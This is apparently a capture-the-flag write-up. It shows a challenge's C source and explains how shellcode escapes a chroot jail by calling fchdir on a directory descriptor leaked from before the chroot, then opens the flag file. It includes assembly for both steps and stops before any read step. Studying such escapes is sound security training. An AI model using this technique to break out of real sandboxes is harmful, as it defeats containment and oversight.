#metadata(
  (
    title: "Chroot Escape via fchdir",
    description: "Using the fchdir syscall on a pre-opened directory descriptor to move the process's current working directory outside of the chroot jail.",
    date: "2025-12-30",
    order: 6,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project


== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    assert(argc > 1);

    // Checking to make sure you're not trying to open the flag.
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    assert(chroot(jail_path) == 0);

    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);

    int shellcode_size = read(0, shellcode, 0x1000);

    scmp_filter_ctx ctx;

    ctx = seccomp_init(SCMP_ACT_KILL);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fchdir), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

= Chroot Escape via fchdir

== Introduction

This challenge allows `fchdir` in its seccomp filter, which provides a direct way to escape the `chroot` environment if we have an FD to a directory outside.

== Vulnerability Analysis

The process opens `/` before calling `chroot` and `chdir("/")`. This FD points to the host's root directory. The `fchdir` syscall changes the CWD to the directory referred to by an FD, even if that directory is outside the current root.

== Exploitation Steps

=== 1. Escaping the Jail
Call `fchdir` on the leaked root FD (usually 3).

```nasm
/* fchdir(3) */
mov rdi, 3
mov rax, 81 /* SYS_fchdir */
syscall
```

=== 2. Reading the Flag
Once the CWD is outside the jail, we can `open("flag", ...)` directly.

```nasm
/* open("flag", O_RDONLY) */
lea rdi, [rip + flag_str]
mov rsi, 0
mov rax, 2 /* SYS_open */
syscall

```
